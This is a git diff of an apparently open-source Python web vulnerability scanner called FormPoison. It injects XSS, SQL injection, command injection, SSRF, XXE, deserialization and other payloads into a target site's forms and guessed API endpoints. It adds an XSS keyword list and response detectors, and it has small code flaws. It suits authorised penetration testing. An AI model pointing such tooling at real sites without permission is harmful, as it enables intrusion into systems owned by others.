+                await asyncio.sleep(batch_delay)
 
-                    progress.update(main_task, advance=1)
-
-                    if verbose or verbose_all:
-                        console.print(f"[bold blue]Tested form: {result['form_action']} → {result['payload']}[/bold blue]")
-                        console.print(f"[bold blue]Response: {result['response_code']}[/bold blue]")
-
-                # Batch delay
-                if batch_num < total_batches - 1 and batch_delay > 0:
-                    await asyncio.sleep(batch_delay)
-
-        # Close connector in brute mode
         if connector:
             await connector.close()
 
     else:
-        with Progress(
-            BarColumn(bar_width=None),
-            "[progress.percentage]{task.percentage:>3.0f}%",
-            TimeRemainingColumn(),
-            console=console
-        ) as progress:
-
-            task = progress.add_task("[cyan]Testing all forms...", total=total_tests)
-
-            for form, payload in test_combinations:
+        # sequential
+        console.print(f"[bold cyan]Starting sequential testing with {len(forms)} forms × {len(payloads)} payloads[/bold cyan]")
+        
+        total = len(forms) * len(payloads)
+        completed = 0
+        
+        for form_idx, form in enumerate(forms):
+            form_action = form.get('action', 'default')
+            console.print(f"[blue]Testing form {form_idx + 1}/{len(forms)}: {form_action}[/blue]")
+            
+            for payload_idx, payload in enumerate(payloads):
                 result = await test_form_with_payload(form, payload)
                 results.append(result)
-
-                table.add_row(
-                    result["form_action"],
-                    result["payload"],
-                    result["user_agent"][:50] + "..." if len(result["user_agent"]) > 50 else result["user_agent"],
-                    str(result["response_code"]),
-                    ", ".join(result["vulnerabilities"])
-                )
-
-                progress.update(task, advance=1)
-
-                if verbose or verbose_all:
-                    console.print(f"[bold blue]Tested form: {result['form_action']} → {result['payload']}[/bold blue]")
-                    console.print(f"[bold blue]Response: {result['response_code']}[/bold blue]")
-
-                # default delay
+                completed += 1
+                
                 if secs > 0:
                     await asyncio.sleep(secs)
 
-    # results analysis
-    positive_responses = sum(1 for r in results if r['response_code'] == 200)
-    threshold = len(results) * 0.5
-
-    if positive_responses > threshold:
-        console.print(f"[bold red]Too many positive responses were given ({positive_responses}/{len(results)}). You might consider this result as false-positive.[/bold red]")
-
-    console.print(table)
-
-    # save results with metadata
-    results_metadata = {
-        "parameters": {
-            "brute_mode": brute_mode,
-            "max_concurrent": max_concurrent,
-            "timeout": timeout,
-            "batch_size": batch_size,
-            "batch_delay": batch_delay,
-            "max_retries": max_retries,
-            "test_type": "all_forms"
-        },
-        "results": results
-    }
-
-    with open("all_forms_test_results.json", "w") as f:
-        json.dump(results_metadata, f, indent=4)
-
-    console.print(f"[bold green]Test results saved to 'all_forms_test_results.json'[/bold green]")
-
+    vulnerabilities_found = sum(1 for r in results if r.get('vulnerabilities') and any("CONFIRMED" in v for v in r['vulnerabilities']))
+    console.print(f"\n[bold green]✓ Testing completed: {len(results)} requests sent[/bold green]")
+    console.print(f"[bold red]🎯 Vulnerabilities found: {vulnerabilities_found}[/bold red]")
+    
     return results
 
 def analyze_mutation_xss_response(content, payload):
@@ -2194,15 +2221,22 @@ def detect_filename_xss_success(content, filename):
     return False
 
 async def get_user_input_for_fields(input_fields, url):
-
+    console.print(f"""[red]⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠝⡄⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠤⡀⠀⠀⠀⠀⣘⡴⡀⠀⠀
+⠀        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⡄⠡⣀⣤⣶⣿⣿⣷⡱⡀⠀
+⠀ Form  ⠀⠀⠀⠀⠀⠀⢀⣠⣴⠚⢉⠈⡄⢹⣿⣿⠿⠛⠉⠑⡡⠀
+ Poisoner  ⢀⣠⢴⢺⡿⠋⢭⠀⡘⡄⠘⡀⢫⠀⠀⠀⠀⠀⠑⠃
+⠀      ⠀⠀⢰⠁⠀⡀⠁⢣⠐⡈⢆⡱⠜⠊⠑⣀⡆⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⣠⢊⣇⠀⠱⣘⡤⠗⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣀⠠⠐⠉⠀⠁⠈⠓⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀v. 1.0.1.⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀[/red]""")
     console.print(f"[yellow]Target URL: {url}[/yellow]")
     console.print(f"[yellow]Found {len(input_fields)} input fields[/yellow]")
-    console.print("\n[bold cyan]Available options:[/bold cyan]")
-    console.print("[green]• poison - use payload injection[/green]")
+    console.print("\n[bold cyan]Interactive Field Poisoning Shell:[/bold cyan]")
+    console.print("[green]• 'poison' - use payload injection[/green]")
     console.print("[green]• test - use test value[/green]")
     console.print("[green]• skip - skip this field[/green]")
-    console.print("[bold magenta]• custom_text'poison'more_text - payload will be injected where 'poison' is[/bold magenta]")
-    console.print("[bold red]• Press Ctrl+C to cancel[/bold red]\n")
+    console.print("[bold red]• Ctrl+C to exit[/bold red]\n")
 
     field_values = {}
     poison_fields = []
@@ -2250,7 +2284,7 @@ async def get_user_input_for_fields(input_fields, url):
                     break
 
                 elif user_input:
-                    # SPRAWDŹ CZY JEST 'poison' W TEKŚCIE
+                    # if there is 'poison' 
                     if "'poison'" in user_input:
                         field_values[field_name] = user_input
                         poison_fields.append(field_name)
@@ -2270,6 +2304,200 @@ async def get_user_input_for_fields(input_fields, url):
 
     return field_values, poison_fields
 
+async def test_mutation_xss(url, input_fields, cookies, user_agents, method="POST", proxies=None, ssl_cert=None, ssl_key=None, ssl_verify=False, verbose=False, verbose_all=False, secs=0, payload_filters=None):
+    results = []
+    
+    console.print(f"[bold yellow]🧬 Starting mXSS test...[/bold yellow]")
+    console.print(f"[yellow]URL: {url}[/yellow]")
+    console.print(f"[yellow]Fields: {len(input_fields)}[/yellow]")
+    
+    if verbose:
+        for i, field in enumerate(input_fields):
+            field_name = field.get('name') or field.get('id') or f'field_{i}'
+            field_type = field.get('type', 'textarea' if field.name == 'textarea' else 'input')
+            console.print(f"[dim]  {i+1}. {field_name} ({field_type})[/dim]")
+
+    # Load and filter mXSS payloads
+    mXSS_payloads = []
+    try:
+        with open("payloads.json", "r") as f:
+            all_payloads = json.load(f)
+        
+        # Get only mutation XSS payloads
+        mXSS_keywords = ['<img', '<svg', '<math', '<table', '<form', '<select', '<details', 
+                        '<video', '<audio', '<body', 'onerror', 'onload', 'javascript:', 
+                        '<style', '<script', 'background=', 'poster=']
+        
+        for payload in all_payloads:
+            payload_text = payload.get('inputField', '')
+            if any(keyword in payload_text.lower() for keyword in mXSS_keywords):
+                mXSS_payloads.append({
+                    "inputField": payload_text,
+                    "category": f"mXSS_{payload.get('category', 'GENERIC')}"
+                })
+        
+        if payload_filters:
+            filter_patterns = [pattern.strip().lower() for pattern in payload_filters.split(",")]
+            filtered_payloads = []
+            for payload in mXSS_payloads:
+                payload_text = payload.get('inputField', '').lower()
+                if any(pattern in payload_text for pattern in filter_patterns):
+                    filtered_payloads.append(payload)
+            mXSS_payloads = filtered_payloads
+            console.print(f"[yellow]Applied payload filters: {payload_filters}[/yellow]")
+        
+        console.print(f"[green]Loaded {len(mXSS_payloads)} mXSS payloads[/green]")
+            
+    except Exception as e:
+        console.print(f"[red]Error loading payloads: {str(e)}[/red]")
+        return results
+
+    console.print(f"[bold cyan]Executing {len(input_fields)} fields × {len(mXSS_payloads)} payloads = {len(input_fields) * len(mXSS_payloads)} mXSS tests[/bold cyan]")
+
+    async def test_payload(input_field, payload):
+        try:
+            current_user_agent = random.choice(user_agents) if user_agents else "Mozilla/5.0"
+            headers = {'User-Agent': current_user_agent}
+            data = {}
+
+            field_name = input_field.get('name') or input_field.get('id') or 'unknown_field'
+            field_name_key = input_field.get('name') or 'input_field'
+            data[field_name_key] = payload['inputField']
+
+            # other fields with test values
+            for field in input_fields:
+                other_field_name = field.get('name') or 'input_field'
+                if other_field_name != field_name_key:
+                    field_type = field.get('type', 'text')
+                    if field_type == 'email':
+                        data[other_field_name] = 'test@example.com'
+                    elif field_type == 'password':
+                        data[other_field_name] = 'password123'
+                    elif other_field_name.lower() in ['username', 'user', 'login']:
+                        data[other_field_name] = 'testuser'
+                    elif field.name == 'textarea':
+                        data[other_field_name] = 'test content'
+                    else:
+                        data[other_field_name] = 'test'
+
+            if verbose_all:
+                console.print(f"[dim]Sending data: {data}[/dim]")
+
+            ssl_context = ssl.create_default_context()
+            if ssl_cert and ssl_key:
+                ssl_context.load_cert_chain(ssl_cert, ssl_key)
+
+            cookie_jar = aiohttp.CookieJar()
+            for key, value in cookies.items():
+                cookie_jar.update_cookies({key: value})
+
+            async with aiohttp.ClientSession(cookie_jar=cookie_jar, connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
+                if method.upper() == "GET":
+                    response = await session.get(url, params=data, headers=headers, proxy=proxies.get('http') if proxies else None, ssl=ssl_verify)
+                else:
+                    response = await session.post(url, data=data, headers=headers, proxy=proxies.get('http') if proxies else None, ssl=ssl_verify)
+                
+                content = await response.text()
+                status_code = response.status
+
+                vulnerabilities = analyze_mutation_xss_response(content, payload['inputField'])
+
+                timestamp = time.strftime("%H:%M:%S")
+                short_payload = payload['inputField'][:60] + "..." if len(payload['inputField']) > 60 else payload['inputField']
+                
+                if vulnerabilities:
+                    console.print(f"[{timestamp}] [mXSS] Testing '{field_name}' → '{short_payload}' -> [bold red]{status_code} 💀 VULNERABLE[/bold red]")
+                    for vuln in vulnerabilities:
+                        console.print(f"[{timestamp}] [CRITICAL] {vuln}")
+                else:
+                    if verbose:
+                        console.print(f"[{timestamp}] [mXSS] Testing '{field_name}' → '{short_payload}' -> [green]{status_code}[/green]")
+
+                result = {
+                    "input_field": field_name,
+                    "payload": payload['inputField'],
+                    "category": payload['category'],
+                    "status_code": status_code,
+                    "vulnerabilities": vulnerabilities
+                }
+                results.append(result)
+
+        except Exception as e:
+            timestamp = time.strftime("%H:%M:%S")
+            short_payload = payload['inputField'][:60] + "..." if len(payload['inputField']) > 60 else payload['inputField']
+            field_name = input_field.get('name') or input_field.get('id') or 'unknown_field'
+            console.print(f"[{timestamp}] [mXSS] Testing '{field_name}' → '{short_payload}' -> [red]Error: {str(e)}[/red]")
+
+    # Execute tests sequentially for clean output
+    completed = 0
+    total = len(input_fields) * len(mXSS_payloads)
+    
+    for i, input_field in enumerate(input_fields):
+        field_name = input_field.get('name') or input_field.get('id') or f'field_{i}'
+        console.print(f"[blue]Testing field {i+1}/{len(input_fields)}: {field_name}[/blue]")
+        
+        for j, payload in enumerate(mXSS_payloads):
+            await test_payload(input_field, payload)
+            completed += 1
+            
+            if verbose:
+                console.print(f"[dim]Progress: {completed}/{total} ({completed/total*100:.1f}%)[/dim]")
+            
+            if secs > 0:
+                await asyncio.sleep(secs)
+
+    # Summary
+    vulnerabilities_found = sum(1 for r in results if r.get('vulnerabilities') and len(r['vulnerabilities']) > 0)
+    console.print(f"\n[bold green]✓ mXSS testing completed: {len(results)} tests executed[/bold green]")
+    console.print(f"[bold red]🎯 mXSS vulnerabilities found: {vulnerabilities_found}[/bold red]")
+    
+    # Show vulnerable results
+    vulnerable_results = [r for r in results if r.get('vulnerabilities')]
+    if vulnerable_results:
+        console.print(f"\n[bold yellow]VULNERABLE mXSS RESULTS:[/bold yellow]")
+        for result in vulnerable_results:
+            console.print(f"[red]  Field: {result['input_field']}[/red]")
+            console.print(f"[red]  Payload: {result['payload'][:80]}...[/red]")
+            console.print(f"[red]  Vulnerabilities: {', '.join(result['vulnerabilities'])}[/red]")
+            console.print(f"[red]  Status: {result['status_code']}[/red]")
+            console.print("")
+
+    # Save results
+    with open("mXSS_results.json", "w") as f:
+        json.dump(results, f, indent=2)
+    
+    console.print(f"[green]Results saved to: mXSS_results.json[/green]")
+    
+    return results
+
+def analyze_mutation_xss_response(content, payload):
+    vulnerabilities = []
+    
+    # Check for execution evidence
+    if 'alert(1)' in content:
+        if '<script>' in content and 'alert(1)' in content:
+            vulnerabilities.append("SCRIPT_EXEC")
+        if 'onerror' in content and 'alert(1)' in content:
+            vulnerabilities.append("ONERROR_EXEC") 
+        if 'onload' in content and 'alert(1)' in content:
+            vulnerabilities.append("ONLOAD_EXEC")
+        if 'javascript:' in content.lower() and 'alert(1)' in content:
+            vulnerabilities.append("JS_URL_EXEC")
+    
+    # Check for mutated elements
+    soup = BeautifulSoup(content, 'html.parser')
+    
+    dangerous_elements = soup.find_all(['script', 'img', 'svg', 'math', 'body'])
+    for elem in dangerous_elements:
+        elem_str = str(elem)
+        if 'alert(1)' in elem_str:
+            vulnerabilities.append(f"MUTATED_{elem.name.upper()}")
+    
+    # Additional mXSS detection
+    if soup.find('script') and payload in str(soup):
+        vulnerabilities.append("PAYLOAD_REFLECTED")
+    
+    return vulnerabilities
 async def interactive_injection_mode(url, payloads, cookies, user_agents, method="POST",
                                    proxies=None, ssl_cert=None, ssl_key=None, ssl_verify=False,
                                    verbose=False, verbose_all=False, secs=0,
@@ -2327,13 +2555,13 @@ async def interactive_injection_mode(url, payloads, cookies, user_agents, method
     async def test_with_user_config(payload_index=None, total_payloads=None):
         async with semaphore:
             try:
-                current_user_agent = random.choice(user_agents) if user_agents else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+                current_user_agent = random.choice(user_agents) if user_agents else "FormPoison/v.1.0.1"
                 headers = {'User-Agent': sanitize_user_agent(current_user_agent)}
                 data = {}
 
                 for field_name, user_value in field_values.items():
                     if user_value is None:
-                        # TYLKO PAYLOAD
+                        # ONLY payload 
                         if payload_index is not None and payloads:
                             payload = payloads[payload_index % len(payloads)]
                             data[field_name] = payload['inputField']
@@ -2343,10 +2571,10 @@ async def interactive_injection_mode(url, payloads, cookies, user_agents, method
                             payload_category = "SQL"
 
                     elif "'poison'" in user_value:
-                        # WSTRZYKNIJ PAYLOAD W MIEJSCE 'poison'
+                        # replace 'poison' with payload
                         if payload_index is not None and payloads:
                             payload = payloads[payload_index % len(payloads)]
-                            # ZAMIEŃ 'poison' NA PAYLOAD
+                            # tracking 'poison' 
                             data[field_name] = user_value.replace("'poison'", payload['inputField'])
                             payload_category = payload['category'] + "_INJECTED"
                         else:
@@ -2354,9 +2582,14 @@ async def interactive_injection_mode(url, payloads, cookies, user_agents, method
                             payload_category = "SQL_INJECTED"
 
                     else:
-                        # ZWYKŁA WARTOŚĆ
+                        # user defined input
                         data[field_name] = user_value
                         payload_category = "USER_DEFINED"
+                        
+                if verbose:
+                    timestamp = time.strftime("%H:%M:%S")
+                    current_payload = next((data[f] for f in poison_fields if f in data), "USER_CONFIG")
+                    console.print(f"[{timestamp}] [INFO] Testing payload {current_payload} -> ", end="")
 
                 # Proxy configuration
                 proxy_url = proxies.get('http') if proxies else None
@@ -2391,7 +2624,12 @@ async def interactive_injection_mode(url, payloads, cookies, user_agents, method
 
                 current_payload = next((data[f] for f in poison_fields if f in data), "USER_CONFIG")
                 vulnerabilities = analyze_response(content, response.headers, payload_category, current_payload, verbose_all)
-
+                if verbose:
+                    injection_detected = any("CONFIRMED" in vuln for vuln in vulnerabilities)
+                    if injection_detected:
+                        console.print(f"[bold red]{status_code}[/bold red]")
+                    else:
+                        console.print(f"[green]{status_code}[/green]")
                 result = {
                     "user_config": field_values,
                     "poison_fields": poison_fields,
@@ -2466,10 +2704,6 @@ async def interactive_injection_mode(url, payloads, cookies, user_agents, method
                 await connector.close()
 
         else:
-            # normal mode
-            with Progress(BarColumn(bar_width=None), "[progress.percentage]{task.percentage:>3.0f}%", TimeRemainingColumn(), console=console) as progress:
-                task = progress.add_task("[cyan]Testing payloads...", total=len(payloads))
-
                 for i in range(len(payloads)):
                     result = await test_with_user_config(i, len(payloads))
                     results.append(result)
@@ -2482,7 +2716,6 @@ async def interactive_injection_mode(url, payloads, cookies, user_agents, method
                         ", ".join(result["vulnerabilities"])
                     )
 
-                    progress.update(task, advance=1)
 
                     if verbose or verbose_all:
                         console.print(f"[bold blue]Tested with payload: {result['payload_used']}[/bold blue]")
@@ -2527,16 +2760,380 @@ async def interactive_injection_mode(url, payloads, cookies, user_agents, method
     console.print(f"[bold green]Interactive test results saved to 'interactive_test_results.json'[/bold green]")
 
     return results
+
+async def automated_targeted_testing(url, targeted_payloads, scan_report, cookies, user_agents, 
+                                   proxies=None, ssl_cert=None, ssl_key=None, ssl_verify=False,
+                                   brute_mode=False, max_concurrent=50, timeout=15.0):
+    
+    results = []
+    
+    vuln_groups = {}
+    for payload in targeted_payloads:
+        vuln_type = payload.get('targeted_vulnerability', 'unknown')
+        if vuln_type not in vuln_groups:
+            vuln_groups[vuln_type] = []
+        vuln_groups[vuln_type].append(payload)
+    
+    # page content for form analysis
+    initial_user_agent = user_agents[0] if user_agents else "FormPoison/v.1.0.1"
+    content = await get_page_content(url, initial_user_agent, proxies, ssl_cert, ssl_key, ssl_verify)
+    
+    if not content:
+        console.print("[bold red]Failed to fetch page content[/bold red]")
+        return results
+
+    # test each vulnerability group with appropriate methods
+    for vuln_type, vuln_payloads in vuln_groups.items():
+        console.print(f"[blue]Testing {len(vuln_payloads)} payloads for: {vuln_type}[/blue]")
+        
+        if 'sql' in vuln_type.lower() or 'injection' in vuln_type.lower():
+            await test_sql_injection_targeted(url, vuln_payloads, cookies, user_agents, content,
+                                            proxies, ssl_cert, ssl_key, ssl_verify, brute_mode, max_concurrent, timeout)
+        
+        elif 'xss' in vuln_type.lower() or 'cross' in vuln_type.lower():
+            await test_xss_targeted(url, vuln_payloads, cookies, user_agents, content,
+                                  proxies, ssl_cert, ssl_key, ssl_verify, brute_mode, max_concurrent, timeout)
+        
+        elif 'path' in vuln_type.lower() or 'traversal' in vuln_type.lower() or 'file' in vuln_type.lower():
+            await test_path_traversal_targeted(url, vuln_payloads, cookies, user_agents, content,
+                                             proxies, ssl_cert, ssl_key, ssl_verify)
+        
+        elif 'command' in vuln_type.lower() or 'exec' in vuln_type.lower():
+            await test_command_injection_targeted(url, vuln_payloads, cookies, user_agents, content,
+                                                proxies, ssl_cert, ssl_key, ssl_verify)
+        
+        elif 'deserialization' in vuln_type.lower() or 'serialization' in vuln_type.lower():
+            await test_deserialization_targeted(url, vuln_payloads, cookies, user_agents, content,
+                                              proxies, ssl_cert, ssl_key, ssl_verify, brute_mode, max_concurrent, timeout)
+        
+        elif 'ssrf' in vuln_type.lower() or 'server_request' in vuln_type.lower():
+            await test_ssrf_targeted(url, vuln_payloads, cookies, user_agents, content,
+                                   proxies, ssl_cert, ssl_key, ssl_verify)
+        
+        elif 'xxe' in vuln_type.lower() or 'xml' in vuln_type.lower():
+            await test_xxe_targeted(url, vuln_payloads, cookies, user_agents, content,
+                                  proxies, ssl_cert, ssl_key, ssl_verify)
+        
+        elif 'race' in vuln_type.lower() or 'condition' in vuln_type.lower():
+            await test_race_condition_targeted(url, vuln_payloads, cookies, user_agents, content,
+                                             proxies, ssl_cert, ssl_key, ssl_verify)
+        
+        elif 'buffer' in vuln_type.lower() or 'overflow' in vuln_type.lower():
+            await test_buffer_overflow_targeted(url, vuln_payloads, cookies, user_agents, content,
+                                              proxies, ssl_cert, ssl_key, ssl_verify)
+        
+        elif 'idor' in vuln_type.lower() or 'direct_object' in vuln_type.lower():
+            await test_idor_targeted(url, vuln_payloads, cookies, user_agents, content,
+                                   proxies, ssl_cert, ssl_key, ssl_verify)
+        
+        elif 'csrf' in vuln_type.lower() or 'forgery' in vuln_type.lower():
+            await test_csrf_targeted(url, vuln_payloads, cookies, user_agents, content,
+                                   proxies, ssl_cert, ssl_key, ssl_verify)
+        
+        elif 'open_redirect' in vuln_type.lower():
+            await test_open_redirect_targeted(url, vuln_payloads, cookies, user_agents, content,
+                                            proxies, ssl_cert, ssl_key, ssl_verify)
+        
+        elif 'template' in vuln_type.lower() or 'ssti' in vuln_type.lower():
+            await test_ssti_targeted(url, vuln_payloads, cookies, user_agents, content,
+                                   proxies, ssl_cert, ssl_key, ssl_verify)
+        
+        else:
+            await test_all_forms(url, vuln_payloads, "AUTO", cookies, user_agents,
+                               proxies=proxies, ssl_cert=ssl_cert, ssl_key=ssl_key,
+                               ssl_verify=ssl_verify, brute_mode=brute_mode,
+                               max_concurrent=max_concurrent, timeout=timeout)
+    
+    return results
+
+async def test_sql_injection_targeted(url, payloads, cookies, user_agents, content, proxies, ssl_cert, ssl_key, ssl_verify, brute_mode, max_concurrent, timeout):
+    console.print("[yellow]🎯 Running targeted SQL injection tests[/yellow]")
+    
+    # SQL-specific payloads
+    sql_specific_payloads = [p for p in payloads if 'SQL' in p['category']]
+    
+    if not sql_specific_payloads:
+        console.print("[red]No SQL-specific payloads found[/red]")
+        return
+    
+    # different SQL injection techniques
+    techniques = ['union', 'boolean', 'time', 'error', 'stacked']
+    
+    for technique in techniques:
+        technique_payloads = [p for p in sql_specific_payloads if technique in p['inputField'].lower()]
+        if technique_payloads:
+            console.print(f"[blue]Testing {technique}-based SQLi with {len(technique_payloads)} payloads[/blue]")
+            await test_all_forms(url, technique_payloads, "SQL", cookies, user_agents,
+                               proxies=proxies, ssl_cert=ssl_cert, ssl_key=ssl_key,
+                               ssl_verify=ssl_verify, brute_mode=brute_mode,
+                               max_concurrent=max_concurrent, timeout=timeout)
+
+async def test_xss_targeted(url, payloads, cookies, user_agents, content, proxies, ssl_cert, ssl_key, ssl_verify, brute_mode, max_concurrent, timeout):
+    console.print("[yellow]🎯 Running targeted XSS tests[/yellow]")
+    
+    soup = BeautifulSoup(content, 'html.parser')
+    
+    # Analyze context for XSS
+    script_tags = soup.find_all('script')
+    event_handlers = soup.find_all(onclick=True) + soup.find_all(onload=True) + soup.find_all(onerror=True)
+    
+    # XSS payloads by context
+    dom_payloads = [p for p in payloads if 'DOM' in p['category']]
+    reflected_payloads = [p for p in payloads if 'HTML' in p['category'] or 'XSS' in p['category']]
+    
+    if dom_payloads and (script_tags or event_handlers):
+        console.print(f"[blue]Testing DOM-based XSS with {len(dom_payloads)} payloads[/blue]")
+        await test_all_forms(url, dom_payloads, "HTML", cookies, user_agents,
+                           proxies=proxies, ssl_cert=ssl_cert, ssl_key=ssl_key,
+                           ssl_verify=ssl_verify, brute_mode=brute_mode,
+                           max_concurrent=max_concurrent, timeout=timeout)
+    
+    if reflected_payloads:
+        console.print(f"[blue]Testing reflected XSS with {len(reflected_payloads)} payloads[/blue]")
+        await test_all_forms(url, reflected_payloads, "HTML", cookies, user_agents,
+                           proxies=proxies, ssl_cert=ssl_cert, ssl_key=ssl_key,
+                           ssl_verify=ssl_verify, brute_mode=brute_mode,
+                           max_concurrent=max_concurrent, timeout=timeout)
+
+async def test_path_traversal_targeted(url, payloads, cookies, user_agents, content, proxies, ssl_cert, ssl_key, ssl_verify):
+    console.print("[yellow]🎯 Running targeted path traversal tests[/yellow]")
+    
+    path_payloads = [p for p in payloads if 'PATH' in p['category']]
+    
+    if path_payloads:
+        # file upload
+        soup = BeautifulSoup(content, 'html.parser')
+        file_inputs = soup.find_all('input', {'type': 'file'})
+        
+        if file_inputs:
+            console.print(f"[blue]Testing {len(path_payloads)} path traversal payloads on file inputs[/blue]")
+            for file_input in file_inputs:
+                await test_input_field(url, path_payloads, "PATH", cookies, user_agents, file_input,
+                                     method="POST", proxies=proxies, ssl_cert=ssl_cert, ssl_key=ssl_key, ssl_verify=ssl_verify)
+
+async def test_command_injection_targeted(url, payloads, cookies, user_agents, content, proxies, ssl_cert, ssl_key, ssl_verify):
+    console.print("[yellow]🎯 Running targeted command injection tests[/yellow]")
+    
+    cmd_payloads = [p for p in payloads if 'COMMAND' in p['category']]
+    
+    if cmd_payloads:
+        console.print(f"[blue]Testing {len(cmd_payloads)} command injection payloads[/blue]")
+        await test_all_forms(url, cmd_payloads, "COMMAND", cookies, user_agents,
+                           proxies=proxies, ssl_cert=ssl_cert, ssl_key=ssl_key, ssl_verify=ssl_verify)
+
+async def test_deserialization_targeted(url, payloads, cookies, user_agents, content, proxies, ssl_cert, ssl_key, ssl_verify, brute_mode=False, max_concurrent=50, timeout=15.0):
+    console.print("[yellow]🎯 Running targeted deserialization tests[/yellow]")
+    
+    deserialization_payloads = [p for p in payloads if 'DESERIALIZATION' in p['category'] or 'XXE' in p['category']]
+    
+    if not deserialization_payloads:
+        console.print("[red]No deserialization-specific payloads found[/red]")
+        return []
+
+    console.print(f"[blue]Testing {len(deserialization_payloads)} deserialization payloads[/blue]")
+    
+    results = []
+    
+    # Rozszerzona lista endpointów
+    endpoints = [
+        '/api', '/api/v1', '/api/v2', '/rest', '/rest/api', '/json',
+        '/service', '/services', '/ajax', '/data', '/export',
+        '/servlet', '/struts', '/spring', '/soap', '/xmlrpc',
+        '/upload', '/import', '/export', '/save', '/load'
+    ]
+    
+    tested_endpoints = 0
+    vulnerable_endpoints = 0
+    
+    for endpoint in endpoints:
+        test_url = url.rstrip('/') + endpoint
+        
+        try:
+            console.print(f"[dim]Testing deserialization endpoint: {test_url}[/dim]")
+            
+            endpoint_results = await test_all_forms(
+                test_url, 
+                deserialization_payloads, 
+                "DESERIALIZATION", 
+                cookies, 
+                user_agents,
+                method="POST",
+                proxies=proxies, 
+                ssl_cert=ssl_cert, 
+                ssl_key=ssl_key, 
+                ssl_verify=ssl_verify,
+                brute_mode=brute_mode,
+                max_concurrent=max_concurrent,
+                timeout=timeout
+            )
+            
+            tested_endpoints += 1
+            
+            # check if there is a vuln
+            endpoint_vulnerabilities = []
+            for result in endpoint_results:
+                if isinstance(result, dict) and result.get('vulnerabilities'):
+                    endpoint_vulnerabilities.extend(result['vulnerabilities'])
+                    results.append(result)
+            
+            if any('CONFIRMED' in v for v in endpoint_vulnerabilities):
+                vulnerable_endpoints += 1
+                console.print(f"[bold red]💀 VULNERABLE DESERIALIZATION ENDPOINT: {test_url}[/bold red]")
+                
+        except Exception as e:
+            if args.verbose:
+                console.print(f"[dim]Endpoint {test_url} failed: {e}[/dim]")
+            continue
+
+    console.print(f"[green]Tested {tested_endpoints} deserialization endpoints[/green]")
+    if vulnerable_endpoints > 0:
+        console.print(f"[bold red]🎯 Found {vulnerable_endpoints} vulnerable deserialization endpoints![/bold red]")
+    else:
+        console.print(f"[yellow]No vulnerable deserialization endpoints found[/yellow]")
+    
+    return results
+
+async def test_ssrf_targeted(url, payloads, cookies, user_agents, content, proxies, ssl_cert, ssl_key, ssl_verify):
+    console.print("[yellow]🎯 Running targeted SSRF tests[/yellow]")
+    
+    ssrf_payloads = [p for p in payloads if 'SSRF' in p['category']]
+    
+    if ssrf_payloads:
+        console.print(f"[blue]Testing {len(ssrf_payloads)} SSRF payloads[/blue]")
+        
+        soup = BeautifulSoup(content, 'html.parser')
+        url_inputs = soup.find_all('input', {'type': 'url'}) + soup.find_all('input', {'name': lambda x: x and 'url' in x.lower()})
+        
+        for url_input in url_inputs:
+            await test_input_field(url, ssrf_payloads, "SSRF", cookies, user_agents, url_input,
+                                 method="GET", proxies=proxies, ssl_cert=ssl_cert, ssl_key=ssl_key, ssl_verify=ssl_verify)
+
+async def test_xxe_targeted(url, payloads, cookies, user_agents, content, proxies, ssl_cert, ssl_key, ssl_verify):
+    console.print("[yellow]🎯 Running targeted XXE tests[/yellow]")
+    
+    xxe_payloads = [p for p in payloads if 'XXE' in p['category']]
+    
+    if xxe_payloads:
+        console.print(f"[blue]Testing {len(xxe_payloads)} XXE payloads[/blue]")
+        
+        xml_endpoints = ['/api/xml', '/soap', '/xmlrpc', '/rest', '/feed']
+        for endpoint in xml_endpoints:
+            test_url = url.rstrip('/') + endpoint
+            try:
+                headers = {'Content-Type': 'application/xml'}
+                await test_with_custom_headers(test_url, xxe_payloads, cookies, user_agents, headers,
+                                             proxies, ssl_cert, ssl_key, ssl_verify)
+            except:
+                continue
+
+async def test_ssti_targeted(url, payloads, cookies, user_agents, content, proxies, ssl_cert, ssl_key, ssl_verify):
+    console.print("[yellow]🎯 Running targeted SSTI tests[/yellow]")
+    
+    ssti_payloads = [p for p in payloads if 'SSTI' in p['category']]
+    
+    if ssti_payloads:
+        console.print(f"[blue]Testing {len(ssti_payloads)} SSTI payloads[/blue]")
+        await test_all_forms(url, ssti_payloads, "SSTI", cookies, user_agents,
+                           proxies=proxies, ssl_cert=ssl_cert, ssl_key=ssl_key, ssl_verify=ssl_verify)
+
+async def test_idor_targeted(url, payloads, cookies, user_agents, content, proxies, ssl_cert, ssl_key, ssl_verify):
+    console.print("[yellow]🎯 Running targeted IDOR tests[/yellow]")
+    
+    idor_payloads = [p for p in payloads if 'IDOR' in p['category']]
+    
+    if idor_payloads:
+        console.print(f"[blue]Testing IDOR with {len(idor_payloads)} payloads[/blue]")
+        
+        id_params = ['id', 'user', 'account', 'document', 'file']
+        for param in id_params:
+            test_url = f"{url}?{param}="
+            await test_idor_endpoint(test_url, idor_payloads, cookies, user_agents,
+                                   proxies, ssl_cert, ssl_key, ssl_verify)
+
+async def test_csrf_targeted(url, payloads, cookies, user_agents, content, proxies, ssl_cert, ssl_key, ssl_verify):
+    console.print("[yellow]🎯 Running targeted CSRF tests[/yellow]")
+    
+    csrf_payloads = [p for p in payloads if 'CSRF' in p['category']]
+    
+    if csrf_payloads:
+        console.print(f"[blue]Testing CSRF with {len(csrf_payloads)} payloads[/blue]")
+        await test_all_forms(url, csrf_payloads, "CSRF", cookies, user_agents,
+                           proxies=proxies, ssl_cert=ssl_cert, ssl_key=ssl_key, ssl_verify=ssl_verify)
+
+async def test_open_redirect_targeted(url, payloads, cookies, user_agents, content, proxies, ssl_cert, ssl_key, ssl_verify):
+    console.print("[yellow]🎯 Running targeted open redirect tests[/yellow]")
+    
